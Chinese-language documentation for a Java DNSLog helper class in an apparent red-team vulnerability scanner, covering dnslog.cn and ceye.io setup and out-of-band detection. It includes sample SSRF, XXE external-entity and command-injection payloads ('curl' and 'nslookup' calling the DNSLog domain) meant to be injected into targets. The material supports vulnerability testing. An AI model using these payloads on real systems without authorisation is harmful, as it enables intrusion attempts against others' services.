# DNSLog 服务使用说明

## 概述

`DnsLogService` 是一个集成了多个 DNSLog 平台的服务类，用于在漏洞扫描和POC验证中进行DNS外带检测。

### 支持的平台

| 平台 | 优势 | 限制 |
|------|------|------|
| **dnslog.cn** | 免费，无需配置，即开即用 | 域名有效期较短（约1小时） |
| **ceye.io** | 域名有效期长，功能强大，记录详细 | 需要注册账号并配置 |

---

## 快速开始

### 1. 使用 dnslog.cn（默认）

```java
import com.potato.potatotool.content.redTeam.vulnScanner.http.DnsLogService;

// 生成 DNSLog 域名（自动使用 dnslog.cn）
String domain = DnsLogService.generateDnsLogDomain();
System.out.println("生成的域名: " + domain);

// 在POC中使用这个域名
String payload = "http://" + domain;

// 等待几秒后查询记录
Thread.sleep(3000);
boolean hasResolution = DnsLogService.hasDnsResolution(domain);
if (hasResolution) {
    System.out.println("检测到DNS查询！");
}
```

### 2. 使用 ceye.io

#### 步骤 1: 注册并获取配置

1. 访问 [http://ceye.io/](http://ceye.io/) 注册账号
2. 登录后进入 **个人设置**
3. 获取你的 `identifier` 和 `API Token`

#### 步骤 2: 配置并使用

```java
import com.potato.potatotool.content.redTeam.vulnScanner.http.DnsLogService;

// 配置 ceye.io
DnsLogService.configureCeye("your_identifier", "your_token");

// 切换到 ceye.io 平台
DnsLogService.setPlatform(DnsLogService.Platform.CEYE_IO);

// 生成域名
String domain = DnsLogService.generateDnsLogDomain();
// 输出示例: abc12345.your_identifier.ceye.io

// 查询记录
String records = DnsLogService.queryDnsLogRecords(domain);
System.out.println(records);
```

---

## 连通性测试

在使用前，建议先测试平台的连通性：

```java
// 测试所有平台
DnsLogService.TestResult[] results = DnsLogService.testAllPlatforms();
for (DnsLogService.TestResult result : results) {
    System.out.println(result);
}

// 仅测试 dnslog.cn
DnsLogService.TestResult dnslogCnResult = DnsLogService.testDnslogCnConnectivity();
System.out.println(dnslogCnResult);

// 仅测试 ceye.io
DnsLogService.TestResult ceyeResult = DnsLogService.testCeyeIoConnectivity();
System.out.println(ceyeResult);
```

**输出示例：**
```
[dnslog.cn] ✓ 成功 - 连接成功，域名: abc123.dnslog.cn (耗时: 234ms, 域名: abc123.dnslog.cn)
[ceye.io] ✓ 成功 - 连接成功，identifier: your_id (耗时: 156ms, 域名: xyz456.your_id.ceye.io)
```

---

## API 参考

### 核心方法

#### 生成DNSLog域名
```java
String domain = DnsLogService.generateDnsLogDomain();
```
根据当前平台自动生成唯一的DNSLog域名。

#### 查询DNS记录
```java
String records = DnsLogService.queryDnsLogRecords(domain);
```
查询指定域名的DNS解析记录，返回JSON格式字符串。

#### 检查是否被解析
```java
boolean hasResolution = DnsLogService.hasDnsResolution(domain);
```
快速检查域名是否有DNS解析记录。

### 平台管理

#### 配置 ceye.io
```java
DnsLogService.configureCeye(String identifier, String token);
```

#### 切换平台
```java
DnsLogService.setPlatform(DnsLogService.Platform.DNSLOG_CN);
DnsLogService.setPlatform(DnsLogService.Platform.CEYE_IO);
```

#### 获取当前平台
```java
DnsLogService.Platform current = DnsLogService.getCurrentPlatform();
System.out.println(current.getName()); // "dnslog.cn" 或 "ceye.io"
```

### 连通性测试

```java
// 测试所有平台
DnsLogService.TestResult[] testAllPlatforms();

// 测试单个平台
DnsLogService.TestResult testDnslogCnConnectivity();
DnsLogService.TestResult testCeyeIoConnectivity();
```

### 缓存管理

```java
// 清除缓存（会清除已缓存的域名）
DnsLogService.clearCache();
```

---

## 在POC中使用

### 示例 1: SSRF 检测

```java
String dnslogDomain = DnsLogService.generateDnsLogDomain();

// 构造SSRF Payload
String url = "http://target.com/api?url=http://" + dnslogDomain;

// 发送请求
sendHttpRequest(url);

// 等待并检查
Thread.sleep(3000);
if (DnsLogService.hasDnsResolution(dnslogDomain)) {
    System.out.println("[+] 检测到SSRF漏洞！");
}
```

### 示例 2: XXE 检测

```java
String dnslogDomain = DnsLogService.generateDnsLogDomain();

String xxePayload = "<?xml version=\"1.0\"?>" +
    "<!DOCTYPE foo [" +
    "<!ENTITY xxe SYSTEM \"http://" + dnslogDomain + "/xxe\">" +
    "]>" +
    "<data>&xxe;</data>";

// 发送包含XXE Payload的请求
sendXmlRequest(xxePayload);

// 检查DNS记录
Thread.sleep(2000);
String records = DnsLogService.queryDnsLogRecords(dnslogDomain);
if (records != null && !records.isEmpty()) {
    System.out.println("[+] 检测到XXE漏洞！");
    System.out.println("DNS记录: " + records);
}
```

### 示例 3: 命令执行检测

```java
String dnslogDomain = DnsLogService.generateDnsLogDomain();

// 构造命令执行Payload（Linux）
String linuxCmd = "curl http://" + dnslogDomain + "/rce";

// 或 Windows
String windowsCmd = "nslookup " + dnslogDomain;

// 在POC中注入这些命令...
```

---

## 最佳实践

### 1. 平台选择建议

- **快速扫描**: 使用 `dnslog.cn`（默认），无需配置
- **深度测试**: 配置 `ceye.io`，记录更详细且持久
- **批量扫描**: 优先 `dnslog.cn`，失败时自动切换 `ceye.io`

### 2. 超时设置

```java
// DNS查询通常需要几秒时间
Thread.sleep(2000); // 最少等待2秒
Thread.sleep(5000); // 建议等待5秒
```

### 3. 错误处理

```java
try {
    String domain = DnsLogService.generateDnsLogDomain();
    if (domain.contains("example.com")) {
        System.err.println("警告: 使用了占位符域名，平台可能不可用");
    }
} catch (Exception e) {
    System.err.println("DNSLog服务异常: " + e.getMessage());
}
```

### 4. 缓存管理

```java
// 扫描前清除缓存，确保使用新域名
DnsLogService.clearCache();

// 扫描结束后也可以清除缓存
DnsLogService.clearCache();
```

---

## 常见问题

### Q1: 为什么生成的域名是 `xxx.dnslog.example.com`？

**A:** 这是占位符域名，说明平台不可用或网络连接失败。请：
1. 检查网络连接
2. 测试平台连通性：`DnsLogService.testAllPlatforms()`
3. 尝试切换平台

### Q2: 查询不到DNS记录怎么办？

**A:** 可能的原因：
1. DNS查询尚未到达（等待时间不够）
2. 目标系统没有进行DNS查询（POC未生效）
3. 网络限制（防火墙拦截了DNS外带）
4. 平台缓存延迟

**解决方法：**
```java
// 增加等待时间
Thread.sleep(5000);

// 多次查询
for (int i = 0; i < 3; i++) {
    Thread.sleep(2000);
    if (DnsLogService.hasDnsResolution(domain)) {
        break;
    }
}
```

### Q3: ceye.io 返回 401 错误？

**A:** Token 配置错误，请：
1. 确认 identifier 和 token 正确
2. 重新从 ceye.io 个人设置中复制
3. 检查是否有多余的空格或换行符

```java
// 确保去除空格
String identifier = "your_id".trim();
String token = "your_token".trim();
DnsLogService.configureCeye(identifier, token);
```

---

## 完整示例

参考代码：[DnsLogServiceExample.java](../examples/DnsLogServiceExample.java)

运行示例：
```bash
java com.potato.potatotool.content.redTeam.vulnScanner.examples.DnsLogServiceExample
```

---

## 技术细节

### 平台特性对比

| 特性 | dnslog.cn | ceye.io |
|------|-----------|---------|
| 注册要求 | 无 | 需要 |
| 配置要求 | 无 | identifier + token |
| 域名格式 | `{random}.{base}.dnslog.cn` | `{random}.{identifier}.ceye.io` |
| 域名有效期 | ~1小时 | 长期 |
| 记录保存 | 短期 | 长期 |
| HTTP记录 | 不支持 | 支持 |
| API限流 | 无 | 有 |

### 缓存策略

- dnslog.cn 域名缓存 1 小时
- LRU缓存，自动淘汰旧域名
- 文件修改时自动失效

---

**更新时间**: 2025-10-29  
**版本**: 1.0.0

